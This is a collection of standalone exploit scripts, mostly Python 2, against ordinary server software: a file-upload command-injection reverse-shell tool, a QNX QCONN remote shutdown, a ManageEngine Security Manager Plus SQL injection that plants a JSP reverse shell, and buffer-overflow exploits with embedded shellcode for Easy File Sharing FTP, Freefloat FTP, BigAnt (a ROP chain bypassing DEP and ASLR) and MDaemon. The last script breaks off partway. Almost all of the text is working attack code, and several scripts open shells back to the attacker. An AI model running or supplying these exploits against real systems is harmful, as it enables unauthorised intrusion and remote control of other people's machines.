					sys.stderr.write('# '); # Insert fake prompt
				last = datetime.datetime.now()
				data = sock.recv(1024)
				if not data:
					break
				while True:
					nleft = len(data)
					nleft -= os.write(fd, data)
					if nleft == 0:
						break
		except Exception as e:
			print e
			pass
		sock.close()
		self.running = False

	def parse_options(self):
		parser = OptionParser(usage="usage: %prog [options]")
		parser.add_option("-r", "--remote-host", action="store", type="string", dest="hostname", 
			help="Specify the host to connect to")
		parser.add_option("-l", "--listener-address", action="store", type="string", dest="listener_ip", 
			help="Target IP for reverse shell connection")
		parser.add_option("-p","--port",action="store",type="int",dest="port",
			help="TCP port for the reverse shell connection")

		parser.set_defaults(hostname=None, listener_ip=None, port=7777)
		(options, args) = parser.parse_args();

		if(options.hostname == None):
			sys.stdout.write("Remote hostname/IP required\n")
			parser.print_help()
			sys.exit()
		
		#self.forced_bind = (options.listener_ip != None)
		self.listener_ip = options.listener_ip		
		self.hostname = options.hostname
		self.port = options.port

	def start_local_listener(self):
		self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,  1)

		try:
			self.serv.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
		except socket.error:
			sys.stderr.write("[-] Unable to set TCP_NODELAY")
		
		try:
			self.serv.bind((self.listener_ip, self.port))
		except:
			print "[-] Unable to bind to given IP-address. Attempting to bind on default address. You probably need a #NAT/PAT rule if you're behind a firewall." 		
			try:
				self.serv.bind(('', self.port))
			except:
				print "[-] Unable to bind to default address. Aborting."
				sys.exit(2)

		print "[*] Listener started on %s:%s" % (self.serv.getsockname()[0], self.port)
			
		self.serv.listen(5)
		self.clientsock, addr = self.serv.accept()
		print "[*] Incoming connection from %s:%s" % (self.clientsock.getsockname()[0], self.clientsock.getsockname()[1])
		self.clientsock.send('/bin/busybox uname -a\n');
		banner = self.clientsock.recv(2048)
		if (banner.find('Linux'))>=0:
			print "[*] W00t W00t, got shell!\n\n%s\n" % banner		
		thread.start_new_thread(self.stdin_thread, (self.clientsock,))
		thread.start_new_thread(self.stdout_thread, (self.clientsock,))
		
	def connect_socket(self):
		print "[*] Connecting..."
		try:
			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.socket.connect( (self.hostname, 80) )
			if not self.listener_ip:
				self.listener_ip = self.socket.getsockname()[0]
			print "[*] Connected to %s (%s) " % (self.hostname, self.socket.getpeername()[0])
		except Exception as inst:
			print inst
			print "[-] Unable to connect"
			sys.exit(2)
			
	def upload_payload(self):
		print "[*] Uploading payload\n"
		try:
			self.socket.send('POST %s HTTP/1.1\n' % upload_url)
			self.send_headers()
			ct = 'Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n'
			begin_file='-----------------------------41184676334\r\n\
Content-Disposition: form-data; name="file"; filename="%s"\r\n\
Content-Type: application/octet-stream\r\n\r'
			end_file='\r\n-----------------------------41184676334--\r\n'
			pl = ''.join([begin_file, sh_script, end_file]) % (sh_name, self.listener_ip, self.port, sh_name)
			cl = 'Content-Length: %s\r\n\r\n' % (len(pl))
			crlf = '\r\n'
			data = ''.join([ct,cl,pl,crlf])
			self.socket.send(data)
			if self.socket.recv(2048).find("200 OK")>=0 and self.socket.recv(2048).find('/tmp/'+sh_name)>=0:
				print "[*] Payload succesfully uploaded"
				self.socket.close()
			else:
				print "[-] Unexpected response. Trying to proceed anyway."				
		except:
			print "[-] Error uploading payload. Aborting."
			sys.exit(2)
			
	def send_headers(self):
		data = headers %(self.hostname, self.hostname)
		self.socket.send(data)
	
	def execute_payload(self):
		print "[*] Executing payload"
		cmd = '/tmp/' + sh_name
		req = 'GET %s HTTP/1.1\r\n' % (cmd_inj_url % cmd)
		cr = '\r\n'
		self.socket.send(''.join([req,cr])) 
		self.send_headers()
		if self.socket.recv(2048).find("200 OK")>=0:
			print "[*] Finished executing payload"
		self.socket.close()

	def run(self):
		self.line_buf = ''
		self.prompt = False
		self.parse_options()
		self.connect_socket()
		thread.start_new_thread(self.start_local_listener, ())
		self.upload_payload()
		self.connect_socket()
		self.execute_payload()
		print "[*] Waiting for reverse shell connection"
		self.running = True
		while self.running:
			pass
		
exploit = Exploit()
exploit.run()# Title : QNX QCONN Remote Command Execution Vurnerability
# Version : QNX 6.5.0 >= , QCONN >= 1.4.207944
# Download: http://www.qnx.com/download/feature.html?programid=23665 (QNX Neutrino 6.5.0 SP1)
# Vendor : http://www.qnx.com
# Date : 2012/09/09
# CVE : N/A
# Exploit Author : Mor!p3r(moriper[at]gmail.com)

import telnetlib
import sys

if len(sys.argv) < 3:
  print " "
  print " -----------------------------------------------------"
  print " + Qconn Remote Command Execution PoC (Shutdown) +"
  print " -----------------------------------------------------"
  print " "
  print " + Usage: QCONNRC.py <Target IP> <Port>"
  print "    + Ex> QCONNRC.py 192.168.0.1 8000"
  print ""
  sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
attack ="service launcher\n" + "start/flags 8000 /bin/shutdown /bin/shutdown -b\n" + "continue\n"
telnet = telnetlib.Telnet(host, port)
telnet.write(attack)
print "[+] Finish"
telnet.close()#!/usr/bin/python
#+--------------------------------------------------------------------------------------------------------------------------------+
# Exploit Title     : Security Manager Plus <= 5.5 build 5505 Remote SYSTEM/root SQLi (Win+Linux)
# Date              : 18-10-2012
# Author            : xistence (xistence<[AT]>0x90.nl)
# Software link     : http://www.manageengine.com/products/security-manager/81779457/ManageEngine_SecurityManager_Plus.exe (Win)
# Software link	    : http://www.manageengine.com/products/security-manager/81779457/ManageEngine_SecurityManager_Plus.zip (Linux)
# Vendor site       : http://www.manageengine.com/
# Version           : 5.5 build 5505 and lower
# Tested on         : CentOS 5.x + Windows XP/2008
#
# Vulnerability	    : The SQL injection is possible on the "Advanced Search", the input is not validated correctly. To make it even worse,
#		      the search can be accessed without any authentication. Security Manager Plus also has to run as root or SYSTEM user,
#		      which makes a remote shell with root/SYSTEM privileges possible....
#
# Fix:
# 1. Go to SMP server system and stop SMP service.
# 2. Download the SMP_Vul_fix.zip file from : http://bonitas.zohocorp.com/4264259/scanfi/31May2012/SMP_Vul_fix.zip
# 3. Extract the downloaded file which contains four files : AdvPMServer.jar, AdvPMClient.jar, scanfi.jar and AdventNetPMUnixAgent.jar
# 3. Copy the extracted .jar files to <SMP-HOME>\lib directory (e.g., C:\AdventNet\SecurityManager\lib). [Overwrite the existing jar files and do not rename them]
# 4. Start the SMP service.
#+--------------------------------------------------------------------------------------------------------------------------------+

import urllib, urllib2, cookielib
import sys
import random

if (len(sys.argv) != 5):
    print ""
    print "[*] Security Manager Plus 5.5 build 5505 and lower Remote SYSTEM/root SQLi exploit (Windows+Linux) - xistence (xistence<[at]>0x90.nl) - 2012-05-29"
    print ""
    print "[*] Usage: secman-sql.py <RHOST> <LHOST> <LPORT> <OS>"
    print "[*] I.e.:  ./secman-sql.py www.linux.org 192.168.2.66 8888 linux"
    print "[*] I.e.:  ./secman-sql.py www.microsoft.com 192.168.2.66 8888 win"
    print "[*]"
    print "[*] RHOST = Remote Host which runs Security Manager Plus"
    print "[*] LHOST = IP address of local machine (machine where you run the exploit from"
    print "[*] LPORT = Port on the local machine where you will run NC on for our reverse shell"
    print "[*] OS = linux/win"
    print ""
    print ""
    exit(0)

rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
osys = sys.argv[4]

if osys == 'linux':
	command = "/bin/bash"
elif osys == 'win':
	command = "cmd.exe"
else:
	print "Choose a valid OS, linux/win"
	exit()
	

filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6):
    filename+=i
filename +=".jsp"

output_path = "../../webapps/SecurityManager/%s" %filename

jsp = '''			<%@page import="java.lang.*"%>
			<%@page import="java.util.*"%>
			<%@page import="java.io.*"%>
			<%@page import="java.net.*"%>

			<%
				class StreamConnector extends Thread
				{
					InputStream is;
					OutputStream os;

					StreamConnector( InputStream is, OutputStream os )
					{
						this.is = is;
						this.os = os;
					}

					public void run()
					{
						BufferedReader in  = null;
						BufferedWriter out = null;
						try
						{
							in  = new BufferedReader( new InputStreamReader( this.is ) );
							out = new BufferedWriter( new OutputStreamWriter( this.os ) );
							char buffer[] = new char[8192];
							int length;
							while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
							{
								out.write( buffer, 0, length );
								out.flush();
							}
						} catch( Exception e ){}
						try
						{
							if( in != null )
								in.close();
							if( out != null )
								out.close();
						} catch( Exception e ){}
					}
				}

				try
				{
					Socket socket = new Socket( "''' + lhost +'''", '''+lport+''' );
					Process process = Runtime.getRuntime().exec( "'''+command+'''" );
					( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
					( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
				} catch( Exception e ) {}
			%>'''


jsp = jsp.replace("\n","")
jsp = jsp.replace("\t","")

payload = "1)) "
payload += 'UNION SELECT 0x%s,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,21,22,23,24,25,26,27,28,29 INTO OUTFILE "%s"' % (jsp.encode('hex'),output_path)
payload += " FROM mysql.user WHERE 1=((1"

opener = urllib2.build_opener()
opener.addheaders.append(('Cookie', 'STATE_COOKIE=%26SecurityManager%2FID%2F174%2FHomePageSubDAC_LIST%2F223%2FSecurityManager_CONTENTAREA_LIST%2F226%2FMainDAC_LIST%2F166%26MainTabs%2FID%2F167%2F_PV%2F174%2FselectedView%2FHome%26Home%2FID%2F166%2FPDCA%2FMainDAC%2F_PV%2F174%26HomePageSub%2FID%2F226%2FPDCA%2FSecurityManager_CONTENTAREA%2F_PV%2F166%26HomePageSubTab%2FID%2F225%2F_PV%2F226%2FselectedView%2FHomePageSecurity%26HomePageSecurity%2FID%2F223%2FPDCA%2FHomePageSubDAC%2F_PV%2F226%26_REQS%2F_RVID%2FSecurityManager%2F_TIME%2F31337; 2RequestsshowThreadedReq=showThreadedReqshow; 2RequestshideThreadedReq=hideThreadedReqhide;'))
post_params = urllib.urlencode({'ANDOR' : 'and', 'condition_1' : 'OpenPorts@PORT','operator_1' : 'IN', 'value_1' : payload, 'COUNT' : '1'})

print "[*] Sending evil payload"
resp = opener.open("http://%s:6262/STATE_ID/31337/jsp/xmlhttp/persistence.jsp?reqType=AdvanceSearch&SUBREQUEST=XMLHTTP" %rhost, post_params)
print "[*] Created Reverse JSP shell http://%s:6262/%s" % (rhost,filename)
resp = opener.open("http://%s:6262/%s"  % (rhost,filename))
print "[*] Check your shell on %s %s\n" % (lhost,lport)
 

#!/usr/bin/python
#Easy File Sharing FTP Server 2.0 (PASS) 0day PoC exploit
#Proof of Concept: execute calc.exe
#Bug found by h07 <h07@interia.pl>
#Tested on XP SP2 polish
#Date: 28.07.2006
#
#BUFF([PASS + 0x20]+[0x2c]+[NOP * 2571]+[0x41414141]+[\r\n])
#EIP = 0x41414141

host = "127.0.0.1"
port = 21
len_recv = 1024
user_name = "anonymous"
NOP_LEN = 2571
EIP = 0x77AB367B #popad pop ret (CRYPT32.DLL) XP SP2 polish

from socket import *

shellcode = ( #execute calc.exe <metasploit.com>
"\x31\xc9\x83\xe9\xdb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd8"
"\x22\x72\xe4\x83\xeb\xfc\xe2\xf4\x24\xca\x34\xe4\xd8\x22\xf9\xa1"
"\xe4\xa9\x0e\xe1\xa0\x23\x9d\x6f\x97\x3a\xf9\xbb\xf8\x23\x99\x07"
"\xf6\x6b\xf9\xd0\x53\x23\x9c\xd5\x18\xbb\xde\x60\x18\x56\x75\x25"
"\x12\x2f\x73\x26\x33\xd6\x49\xb0\xfc\x26\x07\x07\x53\x7d\x56\xe5"
"\x33\x44\xf9\xe8\x93\xa9\x2d\xf8\xd9\xc9\xf9\xf8\x53\x23\x99\x6d"
"\x84\x06\x76\x27\xe9\xe2\x16\x6f\x98\x12\xf7\x24\xa0\x2d\xf9\xa4"
"\xd4\xa9\x02\xf8\x75\xa9\x1a\xec\x31\x29\x72\xe4\xd8\xa9\x32\xd0"
"\xdd\x5e\x72\xe4\xd8\xa9\x1a\xd8\x87\x13\x84\x84\x8e\xc9\x7f\x8c"
"\x28\xa8\x76\xbb\xb0\xba\x8c\x6e\xd6\x75\x8d\x03\x30\xcc\x8d\x1b"
"\x27\x41\x13\x88\xbb\x0c\x17\x9c\xbd\x22\x72\xe4")

def intel_order(i):
   a = chr(i % 256)
   i = i >> 8
   b = chr(i % 256)
   i = i >> 8
   c = chr(i % 256)
   i = i >> 8
   d = chr(i % 256)
   str = "%c%c%c%c" % (a, b, c, d)
   return str

s = socket(AF_INET, SOCK_STREAM)
s.connect((host, port))
print s.recv(len_recv)

buffer = "USER %s\r\n" % (user_name)

s.send(buffer)
print s.recv(len_recv)

buffer = "PASS "
buffer += "\x2c"
buffer += "\x90" * (NOP_LEN - len(shellcode))
buffer += shellcode
buffer += intel_order(EIP)
buffer += "\r\n"

s.send(buffer)
print s.recv(len_recv)
s.close()

#EoF

# milw0rm.com [2006-08-21]
#!/usr/bin/python

#########################################################################################################################################
# Title************************Freefloat FTP Server PUT Command Buffer Overflow
# Discovered and Reported******22nd of September, 2012 
# Discovered/Exploited By******Jacob Holcomb/Gimppy042
# Software Vendor**************http://www.freefloat.com/
# CVE for PUT Overflow*********CVE-2012-5106
# Exploit/Advisory*************http://infosec42.blogspot.com/2012/09/freefloatftp-10-put-buffer-overflow.html
# Software*********************Freefloat FTP Server Version 1.0
# Tested Platform**************Windows XP Professional SP2
# Date*************************22/09/2012
#
#Credits for original Buffer Overflow discovery in FreeFloatFTP 1.0 go to
#Veerendra G.G of SecPod Technologies
#For first discovering that FreeFloat FTP had several FTP commands that could cause a Stack Based overflow condition.
#
#In my disclosure to FreeFloat, I reported my discovery and notified them that other exploits for various FTP commands supported by
#the FreeFloat FTP existed on the internet just to be assured they knew as SecPod reported their findings last year. They responded and
#acknowledged my discovered vulnerability along with the others in the wild. They also stated the following...
#"In fact we have issued an end of life for the software and it will be taken off-line October 1st."
#
#PS - This is a good piece of software to practice Stack Based Buffer Overflows if you curiouz and want to learnz
#########################################################################################################################################

import socket

def Overflow():

	print "[!!!!] INSTRUCTIONS:\n\n[*] Use the commeneted out msfpayload command to generate shellcode for your environment and replace the shellcode variable with your shellcode\n[*] Make sure you start a proper listener if using reverse shell\n\n"
	server = raw_input("\n[*] Please enter the IP address of a server you wish to exploit:\n\n>")
	port = int(21)
	user = raw_input("\n[*] Please enter a username for the FTP server:\n\n>")
	password = raw_input("\n[*] Please enter a password for username:\n\n>")
	cmd = "put "
	nopsled = "\x90" * 32
	junk = "\x90" * 247
	junk2 = "\x90" * 65
	ret_addr = "\xED\x1E\x94\x7C" #7C941EED - FFE4 - JMP ESP <NTDLL.dll XP sp2> - Dont forget little endian!

	#msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.117 LPORT=2107 EXITFUNC=thread R | msfencode -c 1 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20\x7b" R
	shellcode = ("\xdb\xc3\xd9\x74\x24\xf4\xbd\x06\xbd\x1f\xaa\x5f\x33\xc9" +
	"\xb1\x49\x31\x6f\x19\x83\xef\xfc\x03\x6f\x15\xe4\x48\xe3" +
	"\x42\x61\xb2\x1c\x93\x11\x3a\xf9\xa2\x03\x58\x89\x97\x93" +
	"\x2a\xdf\x1b\x58\x7e\xf4\xa8\x2c\x57\xfb\x19\x9a\x81\x32" +
	"\x99\x2b\x0e\x98\x59\x2a\xf2\xe3\x8d\x8c\xcb\x2b\xc0\xcd" +
	"\x0c\x51\x2b\x9f\xc5\x1d\x9e\x0f\x61\x63\x23\x2e\xa5\xef" +
	"\x1b\x48\xc0\x30\xef\xe2\xcb\x60\x40\x79\x83\x98\xea\x25" +
	"\x34\x98\x3f\x36\x08\xd3\x34\x8c\xfa\xe2\x9c\xdd\x03\xd5" +
	"\xe0\xb1\x3d\xd9\xec\xc8\x7a\xde\x0e\xbf\x70\x1c\xb2\xc7" +
	"\x42\x5e\x68\x42\x57\xf8\xfb\xf4\xb3\xf8\x28\x62\x37\xf6" +
	"\x85\xe1\x1f\x1b\x1b\x26\x14\x27\x90\xc9\xfb\xa1\xe2\xed" +
	"\xdf\xea\xb1\x8c\x46\x57\x17\xb1\x99\x3f\xc8\x17\xd1\xd2" +
	"\x1d\x21\xb8\xba\xd2\x1f\x43\x3b\x7d\x28\x30\x09\x22\x82" +
	"\xde\x21\xab\x0c\x18\x45\x86\xe8\xb6\xb8\x29\x08\x9e\x7e" +
	"\x7d\x58\x88\x57\xfe\x33\x48\x57\x2b\x93\x18\xf7\x84\x53" +
	"\xc9\xb7\x74\x3b\x03\x38\xaa\x5b\x2c\x92\xc3\xf1\xd6\x75" +
	"\x2c\xad\xd8\xf0\xc4\xaf\xda\xf2\x2f\x26\x3c\x68\x40\x6e" +
	"\x96\x05\xf9\x2b\x6c\xb7\x06\xe6\x08\xf7\x8d\x04\xec\xb6" +
	"\x65\x61\xfe\x2f\x86\x3c\x5c\xf9\x99\xeb\xcb\x06\x0c\x17" +
	"\x5a\x50\xb8\x15\xbb\x96\x67\xe6\xee\xac\xae\x72\x51\xdb" +
	"\xce\x92\x51\x1b\x99\xf8\x51\x73\x7d\x58\x02\x66\x82\x75" +
	"\x36\x3b\x17\x75\x6f\xef\xb0\x1d\x8d\xd6\xf7\x82\x6e\x3d" +
	"\x06\xff\xb8\x78\x8c\x09\xcf\x68\x4c")

	#Fuzz Buffer
	#buffer = "PUT " + "\x90" * 720

	#Exploit Buffer
	buffer = cmd + junk + ret_addr + nopsled + shellcode + junk2

	print "\n[*] Sending payload in attempt to overflow buffer\n[*] Your payload size is %s\n" % len(buffer)

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((server,port))

		data = s.recv(1024)
		print "[*] %s" %data

		s.send("user " + user + "\r\n")

		data = s.recv(1024)
		print "[*] %s" %data

		s.send("pass " + password + "\r\n")

		data = s.recv(1024)
		print "[*] %s" %data

		s.send(buffer+"\r\n")

		s.close()
		print "\nData was sent. Enjoy your shell\n"

	except:
		print "\n\n[!!!!] There was an error connecting to the server and sending your buffer[!!!!] Please check the following...\n\n[*] Supplied IP address\n[*] Username and Password\n[*] Is your target is online and running FreeFloat FTP server\n\n"


def main():

	print "\n\n# Title************************Freefloat FTP Server PUT Command Buffer Overflow\n# Discovered and Reported******22nd of September, 2012\n# Discovered/Exploited By******Jacob Holcomb/Gimppy042\n# Software Vendor**************http://www.freefloat.com/\n# CVE for PUT Overflow*********CVE-2012-510\n# Exploit/Advisory*************http://infosec42.blogspot.com/\n# Software*********************Freefloat FTP Server Version 1.0\n# Tested Platform**************Windows XP Professional SP2\n# Date*************************22/09/2012\n\n"

	contin = str(None)

	while contin != "yes":
		contin = raw_input("\n[*] Please review the security advisory before proceeding to affirm this exploit is for your target[*]\nWould you like to continue?\n\n>")
		if contin == "no":
			break
		elif contin == "yes":
			break
		elif contin != "yes" or "no":
			print "\n\n[*] You responded with %s. Please respond with yes or no!\n\n"% contin

	if contin == "yes":
		Overflow()
	elif contin == "no":
		print "\n[!!!!] Hmmm..Guess you downloaded the wrong exploit...Back to scanning and enumeration [!!!!]\n"



#Top-level script environment

if __name__ == "__main__":

    main()# Exploit Title: BigAnt Server 2.52 SP5 SEH Stack Overflow ROP-based exploit (ASLR + DEP bypass)
# Date: 03/11/2012
# Exploit Author: Lorenzo Cantoni
# Vendor Homepage: http://www.bigantsoft.com/
# Version: BigAnt Console 2.52 SP5
# Tested on: Windows 7 SP0 x86 Italian - expsrv.dll (6.0.9589)
# Info: Vulnerability discovered by Lincoln: http://www.securityfocus.com/bid/37520/info


import socket
import sys

################
#Attack plan
#1) Overwrite SEH handler with a ROP Gadget that will move the stack pointer inside our buffer and continue the execution from there (ADD ESP,something + RETN should be ok)
#2) Execute the ROP Chain for a VirtualAlloc() and PUSHAD
#3) Run the shellcode
#4) Have fun :)
################


# Memory Layout

################
#
# Padding 
#
################
#
# ROP-NOP Sled
#
################
#
# ROP Chain
#
################
#
# Padding
#
################
#
# NOP SLED
#
################
#
# Shellcode
#
################
#
# Padding
#
################
#
# SEH Overwite (Stack Pivot)
#
################
#
# Padding (may be useful for other shellcode?)
#
################



#From the original exploit, SEH will be overwritten after 966 bytes

target_address=sys.argv[1]
target_port=6660

#./msfpayload windows/shell/reverse_tcp EXITFUNC=thread LHOST=192.168.1.5 LPORT=4444 R | ./msfencode -a x86 -b "\x00\x0a\x0d\x20\x25" -t c
# size 317
shellcode = ("\xb8\xc0\xd7\xb6\x97\xdb\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x49\x31\x45\x14\x03\x45\x14\x83\xc5\x04\x22\x22\x4a\x7f\x2b"
"\xcd\xb3\x80\x4b\x47\x56\xb1\x59\x33\x12\xe0\x6d\x37\x76\x09"
"\x06\x15\x63\x9a\x6a\xb2\x84\x2b\xc0\xe4\xab\xac\xe5\x28\x67"
"\x6e\x64\xd5\x7a\xa3\x46\xe4\xb4\xb6\x87\x21\xa8\x39\xd5\xfa"
"\xa6\xe8\xc9\x8f\xfb\x30\xe8\x5f\x70\x08\x92\xda\x47\xfd\x28"
"\xe4\x97\xae\x27\xae\x0f\xc4\x6f\x0f\x31\x09\x6c\x73\x78\x26"
"\x46\x07\x7b\xee\x97\xe8\x4d\xce\x7b\xd7\x61\xc3\x82\x1f\x45"
"\x3c\xf1\x6b\xb5\xc1\x01\xa8\xc7\x1d\x84\x2d\x6f\xd5\x3e\x96"
"\x91\x3a\xd8\x5d\x9d\xf7\xaf\x3a\x82\x06\x7c\x31\xbe\x83\x83"
"\x96\x36\xd7\xa7\x32\x12\x83\xc6\x63\xfe\x62\xf7\x74\xa6\xdb"
"\x5d\xfe\x45\x0f\xe7\x5d\x02\xfc\xd5\x5d\xd2\x6a\x6e\x2d\xe0"
"\x35\xc4\xb9\x48\xbd\xc2\x3e\xae\x94\xb2\xd1\x51\x17\xc2\xf8"
"\x95\x43\x92\x92\x3c\xec\x79\x63\xc0\x39\x2d\x33\x6e\x92\x8d"
"\xe3\xce\x42\x65\xee\xc0\xbd\x95\x11\x0b\xd6\x3f\xeb\xdc\x19"
"\x17\xf2\x19\xf2\x65\xf5\x30\x5e\xe0\x13\x58\x4e\xa4\x8c\xf5"
"\xf7\xed\x47\x67\xf7\x38\x22\xa7\x73\xce\xd2\x66\x74\xbb\xc0"
"\x1f\x74\xf6\xbb\xb6\x8b\x2d\xd1\x36\x1e\xc9\x70\x60\xb6\xd3"
"\xa5\x46\x19\x2c\x80\xdc\x90\xb8\x6b\x8b\xdc\x2c\x6c\x4b\x8b"
"\x26\x6c\x23\x6b\x12\x3f\x56\x74\x8f\x53\xcb\xe1\x2f\x02\xbf"
"\xa2\x47\xa8\xe6\x85\xc8\x53\xcd\x17\x35\x82\x28\x92\x4f\xa0"
"\x58\x5e")


#  ROP Chain target
#
#            EAX = NOP (0x90909090)
#            ECX = flProtect (0x40)
#            EDX = flAllocationType (0x1000)
#            EBX = dwSize (0x1)
#            ESP = lpAddress (automatic)
#            EBP = ReturnTo (ptr to jmp esp)
#            ESI = ptr to VirtualAlloc()
#            EDI = ROP NOP (RETN)

# we will ROP inside VBAJET32.DLL which is proprietary and an OS DLL, C:\Windows\system32\expsrv.dll


# ADJUST EDX AND EDI
ropchain = ''
for i in range(0,16): ropchain = ropchain + '\xc5\x86\x9e\x0f' #ADD EAX 100 - RETN  # REPEAT 16 TIMES
ropchain = ropchain + '\x3c\xe4\x9e\x0f' # The next gadget point to the following
#0F9EE43C   8BD0             MOV EDX,EAX
#0F9EE43E   8D41 08          LEA EAX,DWORD PTR DS:[ECX+8]
#0F9EE441   C1E0 04          SHL EAX,4
#0F9EE444   2BC2             SUB EAX,EDX
#0F9EE446   5F               POP EDI
#0F9EE447   5E               POP ESI
#0F9EE448   5D               POP EBP
#0F9EE449   5B               POP EBX
#0F9EE44A   C3               RETN

# According to my  registers values, at pivoting time ECX+8 should point to a valid memory location so we go on

ropchain = ropchain + '\x9f\x18\x9a\x0f' # RETN POPPED IN EDI (ROP-NOP)
ropchain = ropchain + '\x41\x41\x41\x41' # compensation for POP ESI 
ropchain = ropchain + '\x41\x41\x41\x41' # compensation for POP EBP
ropchain = ropchain + '\xff\xff\xff\xff' # will be popped in EBX (and incremented later)

# ADJUST ESI. We load the pointer for VirtualAlloc() and then resolve the address
ropchain = ropchain + '\x3c\x7c\x9c\x0f' # POP EAX RETN
ropchain = ropchain + '\xb4\x10\x9a\x0f' # POINTER TO *VirtualAlloc() # !mona ropfunc -m VBAJET32.DLL -cpb '\x00\x0a\x0d\x20\x25'
ropchain = ropchain + '\x09\x2b\x9a\x0f' # we execute a POP ESI + RETN and we load a ROP NOP inside, as we have a CALL ESI later.
ropchain = ropchain + '\x9f\x18\x9a\x0f' # ROP NOP
ropchain = ropchain + '\x9c\x47\x9a\x0f' # resolves the pointer: MOV EAX, DWORD PTR DS:[EAX] -  RETN
ropchain = ropchain + '\x06\x2b\x9a\x0f' # PUSH EAX - CALL ESI - POP ESI - RETN # save the address of VirtualAlloc, call a ROP NOP we have loaded previously, pop the address of VirtualAlloc in ESI, return.


# ADJUST EBX
for i in range(0,2): ropchain = ropchain + '\x08\xa7\x9c\x0f' # INC EBX - RETN # Repeat 2 times, we'll have ebx=1

# ADJUST ECX
ropchain = ropchain + '\x0c\x1f\x9a\x0f' # pop ecx retn
ropchain = ropchain + '\xff\xff\xff\xff' # popped value

for i in range(0,65): ropchain = ropchain + '\xad\x34\x9c\x0f'  #INC ECX - ADD AL,24 - RETN # repeat for 66 times, we'll have ecx=0x40. Dirty way, but we have a lot of space for our ropchain+shellcode

# ADJUST EBP
#Need a gadget which redirect the execution to the stack. 
ropchain = ropchain + '\xaf\x8b\x9c\x0f' # POP EBP retn
ropchain = ropchain + '\x62\x21\x9e\x0f' # Gadget to the following instructions: PUSH ESP - AND AL,1C - RETN

# ADJUST EAX
ropchain = ropchain +'\x3c\x7c\x9c\x0f' # POP EAX - RETN
ropchain = ropchain +'\x90\x90\x90\x90' # value popped in eax

# PUSHAD Gadget 
ropchain = ropchain + '\xc2\x30\x9f\x0f' # PUSHAD - RETN

######### END OF ROP CHAIN

nopsled = "\x90" * 12 # A little bit of nop sled before our shellcode

ropchain = ropchain + nopsled
######### WE HAVE ROP CHAIN + NOPSLED 

payload = '\x41' * 198 #ropchain starts after 210 bytes of padding, due add esp,514
ropnopsled = ''
for i in range (0,5): ropnopsled = ropnopsled + '\x9f\x18\x9a\x0f' # we place some ROP NOP around the 210th byte
payload = payload + ropnopsled
######## END OF PADDING + ROP NOP SLED

payload = payload + ropchain
payload = payload + shellcode
payload = payload + '\x41' * (966 - 198 - len(ropnopsled + ropchain+shellcode))
payload = payload + '\x4d\x26\x9a\x0f' #stack pivoting (overwrite SEH) OF9A264d vbajet32.dll #     ADD ESP,514 - RETN
####### STACK PIVOTED AND SHELLCODE PLACED

padding = '\x90' * (2504 - len(payload)) #Will fill the area after the SEH ovewrite. It might be possible to craft a second staged payload which executes after a jmp short placed in the first overwritten area

buffer = "USV " + payload + padding + "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()

#!/usr/bin/python
import sys
import struct
import socket
from time import sleep
########################################################################################
# MDaemon Pre Authentication (USER) Heap Overflow 
# Code based on Leon Juranic's exploit
# Coded by muts - mati@see-security.com
# http://www.hackingdefined.com
# http://www.remote-exploit.org
# Tested on:
# 	Mdaemon 9.0.5
# 	Mdaemon 7.2.3
# 	Mdaemon 7.2.2
# 	Mdaemon 7.2.1
# 	Mdaemon 7.2.0
#		Possibly Others
#		PLEASE CONTINUE READING !
# Huge greets to xbxice and talz for leading me away from the darkness
########################################################################################
# Mdaemon is wierd. It seems like their developers decided to annoy everyone
# by making their software do unexpected things.
# The exploit overwrites UnhandledExceptionFilter, and jumps to an egghunter
# shellcode - which then scans the memory, and executes a bindshell on port 4444.
# 
# On some Win2k SP4 machines, I found SetUnhandledExceptionFilter at 0x00000214,
# for which I unfortunately had no explenation. 
# I later found out that these machines were fully patched ...
# After inspecting kernel32.dll from my SP4 (not fully patched) and comparing it to 
# todays' version, I noticed that the SetunhandledExceptionFilter function had changed, 
# and looks suspiciously similar to XP SP2... 
# Note that my unpatched win2k was last patched 2-3 weeks ago, 
# so I suspect this change is recent.
# The end of easy UnhandledExceptionFilter exploitation on Win2k ?
#
# So, this is a partially working exploit, on unpatched win2k boxes....
# Kiddies, treat this exploit as DOS :)
#
# I got 3 types of results with this code:
#
# 1. Shell :)	
# 2. Mdaemon process shoots up to 100%, scanning memory for shellcode that isn't there.
# 3. Plain ugly crash - oh well.
#
# At minimum, I'de check the UnhandledExceptionFilter address before running the exploit.
######################################################################################## 
# 
# C:\Documents and Settings\muts>nc -v 192.168.220.128 4444
# 97DACBEC7CA4483 [192.168.220.128] 4444 (?) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-2000 Microsoft Corp.
# 
# C:\MDaemon\APP>
########################################################################################

host="192.168.220.128"

ret = struct.pack("<L",0x7c2f62b6)	# 7c2f62b6 advapi.dll JMP ESI+48 SP4 No Patches
ueh = struct.pack("<L",0x7C54144C)	# SetUnhandledExceptionFilter 0x7C54144C win2k SP4 No Patches
tap = struct.pack("<L",0xeb169090)  	# Short Jump over some garbage

# skape's egghunter shellcode 

egghunter  ="\xeb\x21\x59\xb8\x74\x30\x30\x77\x51\x6a\xff\x33\xdb\x64\x89\x23"
egghunter +="\x6a\x02\x59\x8b\xfb\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f"
